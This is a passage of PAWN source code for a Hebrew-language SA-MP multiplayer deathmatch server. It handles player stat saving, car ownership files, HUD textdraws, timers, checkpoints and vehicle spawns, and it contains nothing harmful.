if(dini_Exists(GetPlayerFile(playerid)) && PlayerInfo[playerid][Logged] == 0) return format(str, sizeof(str), "/login :על מנת להתחיל לשחק התחבר קודם"),SendClientMessage(playerid, red, str),0;



CamreaRandom ++;
SetPlayerMapIcon( playerid, 1, 2057.5842, 843.3260, 6.7031, 53, 0 );//race
SetPlayerMapIcon( playerid, 3, 2001.6742, 1544.2804, 13.5859, 9, 0 );//ship
SetPlayerMapIcon( playerid, 7, 1618.8290,-238.6926,14.1484, 5, 0 );//airport
SetPlayerMapIcon( playerid, 8, 2323.6238, 1425.8101, 42.8203, 55, 0 );//drifts
SetPlayerMapIcon( playerid, 9, 2386.9690, 1043.2112, 10.8203, 27, 0 );//garage
SetPlayerMapIcon( playerid, 10, 2507.1418, 1243.0775, 10.8203, 23, 0 );//club
SetPlayerMapIcon( playerid, 4, -2715.9399, 217.8603, 4.3481, 27, 0 );//מוסך
SetPlayerMapIcon( playerid, 5, 2387.1956, 1050.5073, 10.3850, 27, 0 );//מוסך
SetPlayerMapIcon( playerid, 6, 2646.3372, -2038.0317, 13.1468, 27, 0 );//מוסך
SetTimerEx("CafolMoneyGemel",54*60*1000,1,"i",playerid);
if(CamreaRandom == 3) return CamreaRandom = 1;
return 1;
}
//-=-=-=-=-=-=-=-=-=-=-=-
forward GameModeInitExitFunc();
public GameModeInitExitFunc()
{
fnm

KillTimer(CheckStatusTimer);
TextDrawDestroy(Text:Black0);
TextDrawDestroy(Text:Black1);
TextDrawDestroy(Text:Black2);
TextDrawDestroy(Text:Black3);
TextDrawDestroy(Text:LightBlack);
TextDrawDestroy(Text:BlackHealth);
TextDrawDestroy(Text:DarkRedHealth);
TextDrawDestroy(Text:BlackSpeed);
TextDrawDestroy(Text:DarkYellowSpeed);
TextDrawDestroy(Text:Marker);
TextDrawDestroy(Text:Exclamation);
TextDrawDestroy(Text:VHS[i]);
TextDrawDestroy(Text:LightRedHealth[i]);
TextDrawDestroy(Text:LightYellowSpeed[i]);


GameModeExit();
SaveProperties();
SaveFiles();

//==[Dis]====
//NoMoreObject[i] =0;
FakeKill[i] = 0;
//=[ESC]==========================================================
//gState[i] = e_STATE_NONE;
//=[UnZibori]======================================================
//=[SetVirtualWorldCAR]=============================================
//=[UnIgnoreDisconecet]=========================================
Ignore[i][i] =0;
//=[Weed`s]=======================================================
Stoned[i] =0;
//=[Pet`sDelete]===================================================
if(PlayerInfo[i][Pets] ==1)
{
if(PlayerInfo[i][Shark] ==1)
{
DestroyStreamObject(sam33[i]);
SharkYou[i] =0;
ThePetsInYou[i] =0;
}
if(PlayerInfo[i][Dolp] ==1)
{
DestroyStreamObject(sam22[i]);
ThePetsInYou[i] =0;
DolpYou[i] =0;
}
if(PlayerInfo[i][Tor] ==1)
{
DestroyStreamObject(sam44[i]);
ThePetsInYou[i] =0;
TorYou[i] =0;
}
}
ThePetsInYou[i] =0;
DolpYou[i] =0;
SharkYou[i] =0;
TorYou[i] =0;
//=[Cartem`s]========================================================
pia[i][CarID] = 0;
pia[i][OwnCar] = 0;
//=[FL]==================================================================
PlayerInfo[i][FL] =0;
//=[SavePinfo]============================================================
if(dini_Exists(GetPlayerFile(i)) && IsPlayerLogged(i))
{
PlayerInfo[i][Logged] = 0;
dini_IntSet(GetPlayerFile(i),"Tor",PlayerInfo[i][Tor]);
dini_IntSet(GetPlayerFile(i),"Dolphin",PlayerInfo[i][Dolp]);
dini_IntSet(GetPlayerFile(i),"Pets",PlayerInfo[i][Pets]);
dini_IntSet(GetPlayerFile(i),"Shark",PlayerInfo[i][Shark]);
dini_IntSet(GetPlayerFile(i),"SharkKills",PlayerInfo[i][SharkKills]);
dini_IntSet(GetPlayerFile(i),"TorKills",PlayerInfo[i][TorKills]);
dini_IntSet(GetPlayerFile(i),"DolphinKills",PlayerInfo[i][DolphinKills]);
dini_IntSet(GetPlayerFile(i),"ProfileLogeed",PlayerInfo[i][ProfileLogged]);
dini_IntSet(GetPlayerFile(i),"Logged",PlayerInfo[i][Logged]);
dini_IntSet(GetPlayerFile(i),"Kills",PlayerInfo[i][Kills]);
dini_IntSet(GetPlayerFile(i),"Deaths",PlayerInfo[i][Deaths]);
dini_IntSet(GetPlayerFile(i),"Level",PlayerInfo[i][Level]);
dini_IntSet(GetPlayerFile(i),"GemelLogin",PlayerInfo[i][GemelLogin]);
dini_IntSet(GetPlayerFile(i),"KopatGemel",PlayerInfo[i][KopatGemel]);
dini_IntSet(GetPlayerFile(i),"AggInfo",PlayerInfo[i][AggInfo]);
dini_IntSet(GetPlayerFile(i),"aLevelnl",PlayerInfo[i][aLevelnl]);
dini_IntSet(GetPlayerFile(i),"aKillsnl",PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i),"Adminl",PlayerInfo[i][AdminsLevel]);
dini_IntSet(GetPlayerFile(i),"Wars",PlayerInfo[i][Wars]);
dini_IntSet(GetPlayerFile(i),"Karts",PlayerInfo[i][Kart]);
dini_IntSet(GetPlayerFile(i),"MonsterWin",PlayerInfo[i][Monster]);
dini_IntSet(GetPlayerFile(i),"RPGWIN",PlayerInfo[i][RPGS]);
dini_IntSet(GetPlayerFile(i),"MiniWin",PlayerInfo[i][MINIGUN]);
dini_IntSet(GetPlayerFile(i),"mlg",PlayerInfo[i][Mlg]);
dini_IntSet(GetPlayerFile(i),"Warning",PlayerInfo[i][Warnings]);
dini_IntSet(GetPlayerFile(i),"pWeeds",PlayerInfo[i][Weeds]);
dini_IntSet(GetPlayerFile(i),"TimeOnServer",PlayerInfo[i][TimeOnServer]);
dini_IntSet(GetPlayerFile(i),"Money",GetPlayerMoney(i));
dini_IntSet(GetPlayerFile(i),"autologins",PlayerInfo[i][autologin]);
dini_IntSet(GetPlayerFile(i),"GetAloan",PlayerInfo[i][GetAloan]);
dini_IntSet(GetPlayerFile(i),"MoneyLoan",PlayerInfo[i][MoneyLoan]);
dini_IntSet(GetPlayerFile(i),"armour",PlayerInfo[i][armourT]);
dini_IntSet(GetPlayerFile(i),"VIP",PlayerInfo[i][VIPS]);
dini_IntSet(GetPlayerFile(i),"CC",PlayerInfo[i][CcMode]);
dini_Set(GetPlayerFile(i),"State","Offine");
//=[Delete]=====================================================
PlayerInfo[i][Warnings]=0;
PlayerInfo[i][VIPS] = 0;
PlayerInfo[i][armourT] = 0;
PlayerInfo[i][ProfileLogged] =0;
PlayerInfo[i][Warnings] = 0;
PlayerInfo[i][Weeds] = 0;
PlayerInfo[i][TimeOnServer]=0;
PlayerInfo[i][Logged] = 0;
PlayerInfo[i][Level] = 0;
PlayerInfo[i][Kills] = 0;
PlayerInfo[i][Deaths] = 0;
PlayerInfo[i][Wars] = 0;
PlayerInfo[i][autologin] = 0;
PlayerInfo[i][GetAloan] =0;
PlayerInfo[i][MoneyLoan] =0;
PlayerInfo[i][AdminsLevel] = 0;
PlayerInfo[i][Kart] = 0;
PlayerInfo[i][AggInfo] =0;
PlayerInfo[i][GemelLogin] = 0;
PlayerInfo[i][KopatGemel] =0;
PlayerInfo[i][Monster] = 0;
PlayerInfo[i][RPGS] = 0;
PlayerInfo[i][MINIGUN] = 0;
PlayerInfo[i][Mlg] = 0;
PlayerInfo[i][CcMode] = 0;
PlayerInfo[i][Supportives] =0;
PlayerInfo[i][Tor] =0;
PlayerInfo[i][Pets] =0;
PlayerInfo[i][Shark] =0;
PlayerInfo[i][Dolp] =0;
PlayerInfo[i][SharkKills] =0;
PlayerInfo[i][DolphinKills]=0;
PlayerInfo[i][TorKills] =0;
PlayerInfo[i][bazooka] =0;
PlayerInfo[i][aLevelnl]=0;
PlayerInfo[i][aKillsnl]=0;
PlayerInfo[i][Sawn] = 0;
PlayerInfo[i][MicroSMG] = 0;
PlayerInfo[i][Tec9] = 0;
PlayerInfo[i][M4] = 0;
PlayerInfo[i][MP5] = 0;
PlayerInfo[i][AK47] = 0;
PlayerInfo[i][Knife] = 0;
PlayerInfo[i][Katana] = 0;
PlayerInfo[i][CombatShotGun] = 0;
PlayerInfo[i][ShotGun] = 0;
PlayerInfo[i][SniperRifle] = 0;
PlayerInfo[i][CRifle] = 0;
PlayerInfo[i][Colt] = 0;
PlayerInfo[i][Sawn] = 0;
}
//=[DiscPhone]=================================================================
OnPlayerCommandText(i,"/Hangup");
//=[OutSystem`s]================================================================
if(Registertrs[i] ==1)
{
CPTriatlon[i]=0;
DisablePlayerRaceCheckpoint(i);
Registertrs[i] =0;
CPTriatlon[i]=0;
SetPlayerVirtualWorld(i,0);
RunPlayers--;
}
//=[OutSystem`s]================================================================
if(YouRegister[i] ==1)
{
YouRegister[i] =0;
DisablePlayerRaceCheckpoint(i);
DriftPlayer--;
}
//=[OutSystem`s]================================================================
if(Youregisterrace[i] ==1)
{
Youregisterrace[i] =0;
RacePlayers--;
DisablePlayerRaceCheckpoint(i);
}
//=[OutSystem`s]================================================================
if(PPw[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".עזבת את הפעילות שבה הייתה");
ResetPlayerWeapons(i);
WarPlayersw --; InWarw[i] = 0; PPw[i] = 0;
SetPlayerVirtualWorld(i,0);
}
//=[OutSystem`s]================================================================
if(PP[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".עזבת את הפעילות שבה הייתה");
WarPlayers --;
InWar[i] = 0;
PP[i] = 0;
}
//=[OutSystem`s]================================================================
if(PPr[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".עזבת את הפעילות שבה הייתה");
ResetPlayerWeapons(i);
WarPlayersr --; InWarr[i] = 0; PPr[i] = 0;
SetPlayerVirtualWorld(i,0);
}
//=[OutSystem`s]================================================================

if(MonsterNoTeleportion[i] == 1)
{
MonsterPlayers --; iNmOnster[i] = 0; MonsterNoTeleportion[i] = 0; MonsterFucker[i] = 0;
DestroyVehicle(MonsterSYSTEM[i]);
MonStart[i] =0;
}
//=[OutSystem`s]================================================================
if(KK[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".Kart .עזבת את הפעילות ");
KartPlayers --; InKart[i] = 0; KK[i] = 0; Fuck[i] = 0;
DestroyVehicle(caridxx[i]);
}
//=[LeaveGange`s]====================================================
PlayerLeaveGang(i);
//=[Reason]==========================================================
new string[256];
format(string, sizeof(string), "*** %s has left the server. (ModeReset)", GetName(i)),SendClientMessageToAll(COLOR_GREY, string);
}
return 1;
}
//CAR====
//==============================================================================
forward LoadFiles();
public LoadFiles()
{
	new  VPrice[MAX_VEHICLES];
	VCount =CreateVehicle(411,0,0,0,0,0,0,-1);
	DestroyVehicle(VCount);

	printf(" || - Car In The Mode %d || - Car System - Roy. ",VCount-1);


	for (new car=1; car < VCount; car++)
	{
		format(file,sizeof(file),"Car/car%d.ini",car);
		if(!dini_Exists(file))
		{
			dini_Create(file); CreateCount++;




		    dini_IntSet(file,"CarID",car);


		    dini_Set(file,"CarName",VehNames[GetVehicleModel(car)-400] );
			dini_IntSet(file,"CarModel",GetVehicleModel(car));
		    dini_IntSet(file,"CarOwned",0);
		    dini_Set(file,"CarOwner","אין");

		    dini_IntSet(file,"Buyable",1);
		    dini_IntSet(file,"Price",50000);
		    dini_IntSet(file,"LevelCar",0);
		    dini_IntSet(file,"SaleV",0);



			VehicleInfo[car][LevelCar] = dini_Int(file,"LevelCar");
			VehicleInfo[car][SaleV] = dini_Int(file,"SaleV");

   			VehicleInfo[car][CarID] = dini_Int(file,"CarID");
  
			strmid(VehicleInfo[car][CarName], dini_Get(file,"CarName"), 0, strlen(dini_Get(file,"CarName")), 255);
			VehicleInfo[car][CarModel] = dini_Int(file,"CarModel");
			VehicleInfo[car][CarOwned] = dini_Int(file,"CarOwned");
			strmid(VehicleInfo[car][CarOwner], dini_Get(file,"CarOwner"), 0, strlen(dini_Get(file,"CarOwner")), 255);
			VehicleInfo[car][Buyable] = dini_Int(file,"Buyable");



VPrice[car] = 50000;
for(new v=0; v < sizeof(boat); v++) if(VehicleInfo[car][CarModel] == boat[v][0])
VPrice[car] = 10000;
for(new v=0; v < sizeof(bike); v++) if(VehicleInfo[car][CarModel] == bike[v][0])
VPrice[car] = 300000;
for(new v=0; v < sizeof(plane); v++) if(VehicleInfo[car][CarModel] == plane[v][0])
VPrice[car] = 150000;
for(new v=0; v < sizeof(expensive); v++) if(VehicleInfo[car][CarModel] == expensive[v][0])
VPrice[car] = 100000;
for(new v=0; v < sizeof(Vexpensive); v++) if(VehicleInfo[car][CarModel] == Vexpensive[v][0])
VPrice[car] = 190000;
VehicleInfo[car][Price] = VPrice[car];
dini_IntSet(file,"Price",VehicleInfo[car][Price]);
}
else if(dini_Exists(file))
{
VehicleInfo[car][SaleV] = dini_Int(file,"SaleV");
VehicleInfo[car][LevelCar] = dini_Int(file,"LevelCar");
VehicleInfo[car][CarID] = dini_Int(file,"CarID");
strmid(VehicleInfo[car][CarName], dini_Get(file,"CarName"), 0, strlen(dini_Get(file,"CarName")), 255);
VehicleInfo[car][CarModel] = dini_Int(file,"CarModel");
VehicleInfo[car][CarOwned] = dini_Int(file,"CarOwned");
strmid(VehicleInfo[car][CarOwner], dini_Get(file,"CarOwner"), 0, strlen(dini_Get(file,"CarOwner")), 255);
VehicleInfo[car][Buyable] = dini_Int(file,"Buyable");
VehicleInfo[car][Price] = dini_Int(file,"Price");

if(dini_Int(file,"CarOwned") == 1)
{
printf("           %d       Owner: %s",car,VehicleInfo[car][CarOwner]);
}
}
}
for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) OnPlayerConnect(i);
}
//==============================================================================
public SaveFiles()
{
for (new car=1; car < VCount; car++)
{
format(file,sizeof(file),"Car/car%d.ini",car);
if(dini_Exists(file))
{
dini_IntSet(file,"CarOwned",VehicleInfo[car][CarOwned]);
if(VehicleInfo[car][CarOwned] == 0) dini_Set(file,"CarOwner","אין");
if(VehicleInfo[car][CarOwned] == 1) dini_Set(file,"CarOwner",VehicleInfo[car][CarOwner]);
dini_IntSet(file,"Buyable",VehicleInfo[car][Buyable]);
dini_IntSet(file,"Price",VehicleInfo[car][Price]);
}
}
}
//ENDCAR===
//-=-=-=-=-=-=-



public OnGameModeInit()
{

AddServerRule("versoin mode","0.3.0");
AddServerRule("online players","0");
AddServerRule("last update","9.4.2009");
AddServerRule("updates","101");
SetServerRule("version","0.2X (DM+SZ)");
print("--- Add Timer`s ---");
//SetTimer("reset_bot",15*1000,1);
SetTimer("Maths", 120*60*1000, 1);
SetTimer("fix_world",10*1000,1);
//=[Resert]================================================
CamreaRandom = 1;
gang_jp = GangZoneCreate(955.7469, 290.0929, 903.2562, 864.6604);
SetWorldTime(7);
//=[TextDraw]================================================
	Black0 = TextDrawCreate(481.000000,353.000000,"_");
	Black1 = TextDrawCreate(481.000000,353.000000,"_");
	Black2 = TextDrawCreate(597.000000,353.000000,"_");
	Black3 = TextDrawCreate(481.000000,422.000000,"_");
	TextDrawUseBox(Black0,1);
	TextDrawBoxColor(Black0,0x000000ff);
	TextDrawTextSize(Black0,596.000000,8.000000);
	TextDrawUseBox(Black1,1);
	TextDrawBoxColor(Black1,0x000000ff);
	TextDrawTextSize(Black1,480.000000,0.000000);
	TextDrawUseBox(Black2,1);
	TextDrawBoxColor(Black2,0x000000ff);
	TextDrawTextSize(Black2,596.000000,0.000000);
	TextDrawUseBox(Black3,1);
	TextDrawBoxColor(Black3,0x000000ff);
	TextDrawTextSize(Black3,596.000000,3.000000);
	TextDrawAlignment(Black0,0);
	TextDrawAlignment(Black1,0);
	TextDrawAlignment(Black2,0);
	TextDrawAlignment(Black3,0);
	TextDrawBackgroundColor(Black0,0x000000ff);
	TextDrawBackgroundColor(Black1,0x000000ff);
	TextDrawBackgroundColor(Black2,0x000000ff);
	TextDrawBackgroundColor(Black3,0x000000ff);
	TextDrawFont(Black0,3);
	TextDrawLetterSize(Black0,1.000000,-0.100000);
	TextDrawFont(Black1,3);
	TextDrawLetterSize(Black1,1.000000,7.500000);
	TextDrawFont(Black2,3);
	TextDrawLetterSize(Black2,1.000000,7.500000);
	TextDrawFont(Black3,3);
	TextDrawLetterSize(Black3,1.000000,-0.100000);
	TextDrawColor(Black0,0xffffffff);
	TextDrawColor(Black1,0xffffffff);
	TextDrawColor(Black2,0xffffffff);
	TextDrawColor(Black3,0xffffffff);
	TextDrawSetOutline(Black0,1);
	TextDrawSetOutline(Black1,1);
	TextDrawSetOutline(Black2,1);
	TextDrawSetOutline(Black3,1);
	TextDrawSetProportional(Black0,1);
	TextDrawSetProportional(Black1,1);
	TextDrawSetProportional(Black2,1);
	TextDrawSetProportional(Black3,1);
	TextDrawSetShadow(Black0,1);
	TextDrawSetShadow(Black1,1);
	TextDrawSetShadow(Black2,1);
	TextDrawSetShadow(Black3,1);

	LightBlack = TextDrawCreate(484.000000,355.000000,"_");
	TextDrawUseBox(LightBlack,1);
	TextDrawBoxColor(LightBlack,0x00000033);
	TextDrawTextSize(LightBlack,593.000000,0.000000);
	TextDrawAlignment(LightBlack,0);
	TextDrawBackgroundColor(LightBlack,0x000000ff);
	TextDrawFont(LightBlack,3);
	TextDrawLetterSize(LightBlack,1.000000,7.099995);
	TextDrawColor(LightBlack,0xffffffff);
	TextDrawSetOutline(LightBlack,1);
	TextDrawSetProportional(LightBlack,1);
	TextDrawSetShadow(LightBlack,1);

	BlackHealth = TextDrawCreate(487.000000,385.000000,"_");
	TextDrawUseBox(BlackHealth,1);
	TextDrawBoxColor(BlackHealth,0x00000099);
	TextDrawTextSize(BlackHealth,590.000000,-11.000000);
	TextDrawAlignment(BlackHealth,0);
	TextDrawBackgroundColor(BlackHealth,0x000000ff);
	TextDrawFont(BlackHealth,3);
	TextDrawLetterSize(BlackHealth,1.000000,0.399999);
	TextDrawColor(BlackHealth,0xffffffff);
	TextDrawSetOutline(BlackHealth,1);
	TextDrawSetProportional(BlackHealth,1);
	TextDrawSetShadow(BlackHealth,1);

	DarkRedHealth = TextDrawCreate(488.000000,386.000000,"_");
	TextDrawUseBox(DarkRedHealth,1);
	TextDrawBoxColor(DarkRedHealth,0xff000066);
	TextDrawTextSize(DarkRedHealth,589.000000,0.000000);
	TextDrawAlignment(DarkRedHealth,0);
	TextDrawBackgroundColor(DarkRedHealth,0x000000ff);
	TextDrawFont(DarkRedHealth,3);
	TextDrawLetterSize(DarkRedHealth,1.000000,0.199999);
	TextDrawColor(DarkRedHealth,0xffffffff);
	TextDrawSetOutline(DarkRedHealth,1);
	TextDrawSetProportional(DarkRedHealth,1);
	TextDrawSetShadow(DarkRedHealth,1);

	BlackSpeed = TextDrawCreate(536.000000,403.000000,"_");
	TextDrawUseBox(BlackSpeed,1);
	TextDrawBoxColor(BlackSpeed,0x00000099);
	TextDrawTextSize(BlackSpeed,590.000000,0.000000);
	TextDrawAlignment(BlackSpeed,0);
	TextDrawBackgroundColor(BlackSpeed,0x000000ff);
	TextDrawFont(BlackSpeed,3);
	TextDrawLetterSize(BlackSpeed,1.000000,1.400000);
	TextDrawColor(BlackSpeed,0xffffffff);
	TextDrawSetOutline(BlackSpeed,1);
	TextDrawSetShadow(BlackSpeed,1);
	TextDrawSetProportional(BlackSpeed,1);

	DarkYellowSpeed = TextDrawCreate(537.000000,404.000000,"_");
	TextDrawUseBox(DarkYellowSpeed,1);
	TextDrawBoxColor(DarkYellowSpeed,0xffff0033);
	TextDrawTextSize(DarkYellowSpeed,589.000000,0.000000);
	TextDrawAlignment(DarkYellowSpeed,0);
	TextDrawBackgroundColor(DarkYellowSpeed,0x000000ff);
	TextDrawFont(DarkYellowSpeed,3);
	TextDrawLetterSize(DarkYellowSpeed,1.000000,1.200000);
	TextDrawColor(DarkYellowSpeed,0xffffffff);
	TextDrawSetOutline(DarkYellowSpeed,1);
	TextDrawSetProportional(DarkYellowSpeed,1);
	TextDrawSetShadow(DarkYellowSpeed,1);

	Marker = TextDrawCreate(511.000000,382.000000,"l");
	TextDrawAlignment(Marker,0);
	TextDrawBackgroundColor(Marker,0x000000ff);
	TextDrawFont(Marker,1);
	TextDrawLetterSize(Marker,0.099999,1.000000);
	TextDrawColor(Marker,0xffffffff);
	TextDrawSetOutline(Marker,1);
	TextDrawSetProportional(Marker,1);
	TextDrawSetShadow(Marker,1);

	Exclamation = TextDrawCreate(579.000000,351.000000,"~r~!");
	TextDrawAlignment(Exclamation,0);
	TextDrawBackgroundColor(Exclamation,0x000000ff);
	TextDrawFont(Exclamation,2);
	TextDrawLetterSize(Exclamation,1.200000,3.399999);
	TextDrawColor(Exclamation,0xffffffff);
	TextDrawSetOutline(Exclamation,1);
	TextDrawSetProportional(Exclamation,1);
	TextDrawSetShadow(Exclamation,1);

	CheckStatusTimer = SetTimer("CheckStatus", 200, 1);



Box1 = TextDrawCreate(320.0, 375, "- ~n~ - ~n~ - ~n~ - ~n~ -");
TextDrawAlignment(Box1, 2);
TextDrawBoxColor(Box1,0x000000FF);
TextDrawColor(Box1,0x000000FF);
TextDrawFont(Box1, 2);
TextDrawLetterSize(Box1, 2.2, 4.0);
TextDrawSetProportional(Box1, 1);
TextDrawSetShadow(Box1, 1);
TextDrawTextSize(Box1, 80.0, 1280.0);
TextDrawUseBox(Box1, 1);
Box2 = TextDrawCreate(320.0,0.0, "- ~n~ -");
TextDrawAlignment(Box2, 2);
TextDrawBoxColor(Box2,0x000000FF);
TextDrawColor(Box2,0x000000FF);
TextDrawFont(Box2, 2);
TextDrawLetterSize(Box2, 2.2, 4.0);
TextDrawSetProportional(Box2, 1);
TextDrawSetShadow(Box2, 1);
TextDrawTextSize(Box2, 80.0, 1280.0);
TextDrawUseBox(Box2, 1);


if(!dini_Exists(bbplace))
{
dini_Create(bbplace);
dini_Set(bbplace,"Message1","(1) - None.");
dini_Set(bbplace,"Message2","(2) - None.");
dini_Set(bbplace,"Message3","(3) - None.");
dini_Set(bbplace,"Message4","(4) - None.");
}

if(!dini_Exists("Clans/Clans.ini")) dini_Create("Clans/Clans.ini");

SetTimer("bbshow",10*60*1000,1);



Textdraw1 = TextDrawCreate(1.00000,420.000000,"  Satla-Zone.co.il - DeathMatch.");
TextDrawAlignment(Textdraw1,1);
TextDrawBackgroundColor(Textdraw1,0x00000066);
TextDrawColor(Textdraw1,0x00000066);
TextDrawFont(Textdraw1,1);
TextDrawLetterSize(Textdraw1,0.6,1);

//=[Timer`s]=================================================
print("--- Add Timer`s ---");
SetTimer("OnGetPlayerKeys", 250, 1);
SetTimer("AntiGamebling",3000,1);
//SetTimer("BoomPlayer",1000,1);
SetTimer("AntiMinigun",6*1000,1);
SetTimer("AntiBaz",6*1000,1);
SetTimer("GateMove",1000,1);
//SetTimer("KickUpdate", 100, 1);
SetTimer("Levels",1000, 1);
SetTimer("LoadFiles",4000,0);
SetTimer("loan",60*60*1000,1);
SetTimer("CWarnings",10000,1);
SetTimer("rspam",3500,1);
SetTimer("rrr",5*60*1000,1);
SetTimer("ss",45*60*1000,1);
SetTimer("MoneyGrubScoreUpdate", 1000, 1);
SetTimer("PirateShipScoreUpdate",7000, 1);
SetTimer("TimeUpdate",12*60*1000,1);
SetTimer("Rhelp",20*1000,1);
SetTimer("Rcall",120*1000,1);
SetTimer("Rpet",2*1000,1);
SetTimer("Rfb",20*1000,1);
SetTimer("ClanColor",5000,1);
//SetTimer("AutoChangeHN", 2000, 1);
#if MONEY_CHEAT_USE
SetTimer("moneycheat_check", MONEY_CHEAT_TIMER, 1);
#endif
print("--- Add Timer`s END ---");
print("--- Set HOST NAME ---");
SendRconCommand("hostname Satla-Zone.co.il - Community DeathMatch.");

print("--- Set Mode name && MapName ---");
SendRconCommand("mapname Of The World");
SetGameModeText("Fear DeathMatch.");
//=[TextDraw`s]====================================================
/*
Textdraw1 = TextDrawCreate(1.00000,420.000000,"~l~www.Satla-Zone.co.il - BCV.1.9 - DeatchMatch.");
TextDrawAlignment(Textdraw1,3);
TextDrawBackgroundColor(Textdraw1,-0x1E2E29FF-6);
TextDrawFont(Textdraw1,2);
TextDrawLetterSize(Textdraw1,0.5,1.1);
TextDrawSetOutline(Textdraw1,2);
TextDrawSetProportional(Textdraw1,3);
TextDrawSetShadow(Textdraw1,2);
*/
print("--- Fixeld sys ---");
//=[Fixesystem]====================================================
RaceEnd=1;
//=[Checkpoint]====================================================
print("--- Add CheackPointing ---");
bombshop = CPS_AddCheckpoint(-1380.479,2112.637,41.572,2.5,100);
AmmunationS1 = CPS_AddCheckpoint(-1099.662,-1467.817,125.337,2.5,100);
AmmunationS2 = CPS_AddCheckpoint(-2418.902,2804.939,178.834,2.5,100);
AmmunationS3 = CPS_AddCheckpoint(-675.798,962.942,11.450,2.5,100);
Pirate = CPS_AddCheckpoint(2000.3132,1538.6012,13.5859,2.5,100);

Ammu = CPS_AddCheckpoint(291.0004,-84.5168,1001.5156,2.5,100);
Wang       = CPS_AddCheckpoint(-1919.0795,303.1454,41.0469,2.5,100);
bcp        = CPS_AddCheckpoint(2143.9777,1640.0800,993.5761,2.5,50);
be         = CPS_AddCheckpoint(1448.8737,-2287.2822,13.5469,1.5,50);
nobank     = CPS_AddCheckpoint(2144.0898,1607.6897,993.6882,1.5,50);
//=[Function]=====================================================
print("--- Markers ---");
ShowPlayerMarkers(1);
print("--- Show Tags ---");
ShowNameTags(1);
print("--- Fix Runing ---");
UsePlayerPedAnims();
print("--- Admin Can Teleport from map ---");
AllowAdminTeleport(1/1);
EnableZoneNames(1/1);
print("--- Tire No Popping ---");
EnableTirePopping(0);
print("--- Dont gm on stunts ---");
EnableStuntBonusForAll(0);
print("--- Allow Weapon INT - 10 ---");
AllowInteriorWeapons(10);
//=[Pickup`s]====================================================
//Weed`s:
print("--- Add Pickuping - WEED ---");
Weed[0] = AddStaticPickup(1279, 15, 2199.3457,940.7413,10.8203);
Weed[1] = AddStaticPickup(1279, 15, 1600.4449,1160.7339,10.8125);
Weed[2] = AddStaticPickup(1279, 15, 2590.3806,1656.5795,11.0234);
Weed[3] = AddStaticPickup(1279, 15, 2495.2344,1859.9387,13.6379);
Weed[4] = AddStaticPickup(1279, 15, 2503.3037,-1701.1526,13.5491);
//=[ArenaDM]=====================================================
CreatePickup(356, 2, -1336.165405, 500.960907, 11.304700);
CreatePickup(356, 2, -1336.165405, 500.960907, 11.304700);
CreatePickup(348, 2, -1341.960571, 489.337708, 11.631700);
CreatePickup(351, 2, -1400.373413, 498.355286, 11.195300);
CreatePickup(351, 2, -1422.022339, 508.701385, 11.195300);
CreatePickup(351, 2, -1369.315308, 494.164886, 6.578100);
CreatePickup(356, 2, -1351.863770, 494.665985, 11.195300);
CreatePickup(356, 2, -1394.661499, 488.963593, 3.039100);
CreatePickup(353, 2, -1385.706543, 510.397614, 3.039100);
CreatePickup(349, 2, -1373.084595, 497.853699, 11.195300);
//=[PlayerClass]=================================================
print("--- Add Class ---");
    for(new i = 0; i < 299; i++)
    {
        if(IsValidSkin(i))
        {
            AddPlayerClass(i,2056.5640,840.7169,6.7260,269.1425,0,0,24,300,-1,-1);
        }
    }
print("--- END ADD Classes ---");
//==[Car`s]==============================================================================
//Other:
print("--- Add Cars ---");
AddStaticVehicle(451,2779.8992,2439.7473,10.5110,310.9976,100,100); // Near MInigun THIS NEW
AddStaticVehicle(522,2784.3052,2435.4504,10.3879,317.1129,3,8); // Near MInigun THIS NEW NRG-500 Back Turismo
AddStaticVehicle(560,2788.7144,2431.4922,10.5251,315.8957,33,0); // Near MInigun THIS NEW Sultan
AddStaticVehicle(411,2792.8586,2427.4941,10.5474,315.1897,100,100); // Near MInigun THIS NEW Infernus
AddStaticVehicle(522,1543.9092,787.8228,10.3743,359.6741,6,25); // Car NRG-500 Near "/RACE" Teleportoin
AddStaticVehicle(495,-2404.3225,-2168.5193,33.6143,263.8668,119,122); // /cycletripcar
AddStaticVehicle(495,-2395.8503,-2169.6726,33.6503,265.3340,118,117); // /cycletripcar
AddStaticVehicle(495,-2387.8657,-2169.5796,33.6264,264.8646,116,115); // /cycletripcar
AddStaticVehicle(510,-2412.1035,-2193.2402,32.8842,36.6689,5,5); // /cycletripcar
AddStaticVehicle(510,-2414.2776,-2193.0789,32.8849,43.4173,46,46); // /cycletripcar
AddStaticVehicle(510,-2415.7678,-2186.1248,32.8870,211.6870,6,6); // /cycletripcar
AddStaticVehicle(490,2200.7585,936.2398,10.9478,356.8191,0,0); // FBI

AddStaticVehicle(481,1541.8641,-1368.9618,328.9701,188.6927,46,46); // Tower
AddStaticVehicle(481,1545.6382,-1372.3322,328.9829,177.5936,6,6); // Tower
AddStaticVehicle(522,1552.3627,-1367.2386,329.0129,256.9888,7,79); // Tower
AddStaticVehicle(522,1552.3279,-1365.2297,329.0165,267.8723,0,0); // Tower
AddStaticVehicle(522,-1619.2017,1422.8654,6.2231,322.7849,8,82); // NRG-500 Docks
AddStaticVehicle(522,-1617.0688,1420.7104,6.2286,316.3569,6,25); // NRG-500 Docks

AddStaticVehicle(541,-2414.4514,-586.9969,132.2690,214.4952,22,1); // drift 2
AddStaticVehicle(541,-2411.8425,-585.0082,132.2690,215.0867,86,6); // drift 2
AddStaticVehicle(451,-2400.0386,-589.3455,132.3544,124.6732,123,123); // drift 2
AddStaticVehicle(451,-2398.1990,-591.8680,132.3351,124.4981,36,36); // drift 2
AddStaticVehicle(451,-2396.1416,-594.5746,132.3348,123.8432,16,16); // drift 2
AddStaticVehicle(411,-2397.1367,-611.5197,132.3767,34.8895,75,1); // drift 2
//drifts:
print("--- Add Zibori Car ---");
AddStaticVehicle(568,-302.6403,1552.9385,75.2212,315.1620,56,29); //
AddStaticVehicle(468,-306.8715,1556.4517,75.0231,304.2789,6,6); //
AddStaticVehicle(468,-309.5418,1559.0822,75.0532,317.2950,53,53); //
AddStaticVehicle(451,-293.9301,1573.5503,75.0552,134.0287,123,123); //
